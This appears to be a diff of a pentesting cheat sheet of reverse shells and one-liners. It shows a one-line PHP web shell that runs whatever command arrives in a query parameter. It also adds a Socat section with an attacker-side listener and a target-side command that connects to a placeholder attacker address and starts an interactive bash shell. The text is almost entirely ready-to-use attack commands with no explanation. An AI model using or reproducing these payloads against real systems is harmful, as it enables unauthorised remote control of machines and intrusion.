@@ -6,3 +6,14 @@ Reverse shells and one-liners
 
 # PHP
 <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+
+# Socat
+  - Attacker:
+```
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+```
+  - Target:
+```
+socat TCP:<attacker-ip>:<attacker-lport> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
